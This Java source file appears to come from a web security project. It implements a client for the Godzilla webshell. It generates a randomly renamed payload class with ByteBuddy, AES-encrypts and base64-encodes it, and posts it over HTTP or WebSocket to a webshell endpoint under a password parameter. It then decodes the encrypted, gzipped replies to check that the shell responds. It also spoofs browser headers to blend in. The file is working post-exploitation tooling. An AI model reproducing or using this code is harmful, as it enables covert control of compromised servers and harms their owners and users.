package com.reajason.javaweb.godzilla;

import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import lombok.Getter;
import lombok.Setter;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import okhttp3.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.commons.lang3.tuple.Pair;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

/**
 * @author ReaJason
 */
@Getter
@Setter
public class GodzillaManager implements Closeable {

    private final OkHttpClient client = new OkHttpClient.Builder().build();
    private String cookie = "";
    private String entrypoint;
    private String key;
    private String pass;
    private String md5;
    private Request request;
    private boolean http;
    private boolean ws;
    private Map<String, String> headers = new HashMap<>();

    public static Pair<String, String> getKeyMd5(String key, String pass) {
        String md5Key = DigestUtils.md5Hex(key).substring(0, 16);
        String md5 = DigestUtils.md5Hex(pass + md5Key).toUpperCase();
        return Pair.of(md5Key, md5);
    }

    public static GodzillaManagerBuilder builder() {
        return new GodzillaManagerBuilder();
    }

    @SneakyThrows
    public static byte[] generateGodzilla() {
        try (DynamicType.Unloaded<?> make = new ByteBuddy()
                .redefine(Payload.class)
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .name(Utils.getRandomClassName())
                .make()) {
            return make.getBytes();
        }
    }

    /**
     * AES 加解密
     *
     * @param bytes    加解密的字符串字节数组
     * @param encoding 是否为加密，true 为加密，false 解密
     * @return 返回加解密后的字节数组
     */
    public static byte[] aes(String key, byte[] bytes, boolean encoding) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(encoding ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(bytes);
        } catch (Exception e) {
            return new byte[0];
        }
    }

    private static boolean isValidResponse(String response, String md5) {
        if (StringUtils.isEmpty(response)) {
            return false;
        }
        if (response.length() < 32) {
            return false;
        }
        return response.contains(md5.substring(0, 16)) && response.trim().contains(md5.substring(16));
    }

    @SneakyThrows
    public static String getResultFromRes(String responseBody, String key, String md5) {
        if (!isValidResponse(responseBody, md5)) {
            return responseBody;
        }
        int i = responseBody.indexOf(md5.substring(0, 16));
        String result = responseBody.substring(i + 16);
        int lastIndex = result.indexOf(md5.substring(16));
        result = result.substring(0, lastIndex);
        byte[] bytes = Base64.decodeBase64(result);
        byte[] x = aes(key, bytes, false);
        GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(x));
        return IOUtils.toString(gzipInputStream, StandardCharsets.UTF_8);
    }

    public static Map<String, String> restorePayload(String key, String payload) {
        String p = payload;
        try {
            String urlDecoded = URLDecoder.decode(payload, "UTF-8");
            if (StringUtils.isNoneBlank(urlDecoded)) {
                p = urlDecoded;
            }
        } catch (UnsupportedEncodingException ignored) {

        }
        Map<String, String> map = new HashMap<>();
        byte[] bytes = Base64.decodeBase64(p);
        byte[] x = aes(key, bytes, false);
        ByteArrayInputStream tStream = new ByteArrayInputStream(x);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        byte[] lenB = new byte[4];
        int read;
        try {
            GZIPInputStream inputStream = new GZIPInputStream(tStream);
            while (true) {
                byte t = (byte) inputStream.read();
                if (t != -1) {
                    if (t == 2) {
                        String dataKey = tp.toString();
                        inputStream.read(lenB);
                        int len = bytesToInt(lenB);
                        byte[] data = new byte[len];
                        int readOneLen = 0;
                        do {
                            read = readOneLen + inputStream.read(data, readOneLen, data.length - readOneLen);
                            readOneLen = read;
                        } while (read < data.length);
                        map.put(dataKey, new String(data));
                        tp.reset();
                    } else {
                        tp.write(t);
                    }
                } else {
                    tp.close();
                    tStream.close();
                    inputStream.close();
                    break;
                }
            }
        } catch (Exception ignored) {
        }
        return map;
    }

    public static int bytesToInt(byte[] bytes) {
        return (bytes[0] & 255) | ((bytes[1] & 255) << 8) | ((bytes[2] & 255) << 16) | ((bytes[3] & 255) << 24);
    }

    public static byte[] intToBytes(int value) {
        return new byte[]{(byte) (value & 255), (byte) ((value >> 8) & 255), (byte) ((value >> 16) & 255), (byte) ((value >> 24) & 255)};
    }

    private Response post(byte[] bytes) throws IOException {
        byte[] aes = aes(this.key, bytes, true);
        String base64String = Base64.encodeBase64String(aes);
        RequestBody requestBody = new FormBody.Builder()
                .add(this.pass, base64String)
                .build();
        Request.Builder builder = new Request.Builder()
                .url(this.entrypoint)
                .post(requestBody)
                .headers(Headers.of(this.headers));
        if (StringUtils.isNotBlank(cookie)) {
            builder.header("Cookie", cookie);
        }
        return client.newCall(builder.build()).execute();
    }

    public boolean start() {
        byte[] bytes = generateGodzilla();
        if (isHttp()) {
            try (Response response = post(bytes)) {
                String setCookie = response.header("Set-Cookie");
                if (setCookie != null && setCookie.contains("JSESSIONID=")) {
                    cookie = setCookie.substring(setCookie.indexOf("JSESSIONID="), setCookie.indexOf(";"));
                }
                if (response.isSuccessful()) {
                    return true;
                }
                System.out.println(response.body().string().trim());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        if (isWs()) {
            try {
                byte[] aes = aes(this.key, bytes, true);
                String base64String = Base64.encodeBase64String(aes);
                BlockingJavaWebSocketClient.sendRequestWaitResponse(this.entrypoint, base64String);
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    @SneakyThrows
    public boolean test() {
        byte[] bytes = generateMethodCallBytes("test");
        if (isHttp()) {
            try (Response response = post(bytes)) {
                if (response.isSuccessful()) {
                    ResponseBody body = response.body();
                    if (body != null) {
                        String resultFromRes = getResultFromRes(body.string(), this.key, this.md5);
                        System.out.println(resultFromRes);
                        return "ok".equals(resultFromRes);
                    }
                }
                return false;
            } catch (IOException e) {
                e.printStackTrace();
                return false;
            }
        }

        if (isWs()) {
            byte[] aes = aes(this.key, bytes, true);
            String base64String = Base64.encodeBase64String(aes);
            String response = BlockingJavaWebSocketClient.sendRequestWaitResponse(this.entrypoint, base64String);
            if(StringUtils.isNoneBlank(response)){
                byte[] x = aes(key, Base64.decodeBase64(response), false);
                GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(x));
                return "ok".equals(IOUtils.toString(gzipInputStream, StandardCharsets.UTF_8));
            }
        }

        return false;
    }

    @Override
    public void close() throws IOException {
        byte[] bytes = generateMethodCallBytes("close");
        try (Response response = post(bytes)) {
            if (response.isSuccessful()) {
                response.body();
            }
        } catch (IOException ignore) {

        }
    }

    @SneakyThrows
    private byte[] generateMethodCallBytes(String methodName) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try (GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);) {
            byte[] value = methodName.getBytes();
            gzipOutputStream.write("methodName".getBytes());
            gzipOutputStream.write(2);
            gzipOutputStream.write(intToBytes(value.length));
            gzipOutputStream.write(value);
        }
        return byteArrayOutputStream.toByteArray();
    }

    public static class GodzillaManagerBuilder {
        private final Map<String, String> headers = new HashMap<>();
        private String entrypoint;
        private String key;
        private String pass;

        public GodzillaManagerBuilder entrypoint(String entrypoint) {
            this.entrypoint = entrypoint;
            return this;
        }

        public GodzillaManagerBuilder key(String key) {
            this.key = key;
            return this;
        }

        public GodzillaManagerBuilder pass(String pass) {
            this.pass = pass;
            return this;
        }

        public GodzillaManagerBuilder header(String key, String value) {
            this.headers.put(key, value);
            return this;
        }

        public GodzillaManager build() {
            GodzillaManager manager = new GodzillaManager();
            manager.setEntrypoint(entrypoint);
            manager.setPass(pass);
            Pair<String, String> keyMd5 = getKeyMd5(key, pass);
            manager.setKey(keyMd5.getLeft());
            manager.setMd5(keyMd5.getRight());
            Map<String, String> headers = new HashMap<>(16);
            headers.put("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0");
            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
            headers.put("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
            headers.put("Referer", entrypoint);
            headers.putAll(this.headers);
            manager.setHeaders(headers);
            if (entrypoint.startsWith("http")) {
                manager.setHttp(true);
            }
            if (entrypoint.startsWith("ws")) {
                manager.setWs(true);
            }
            return manager;
        }
    }
}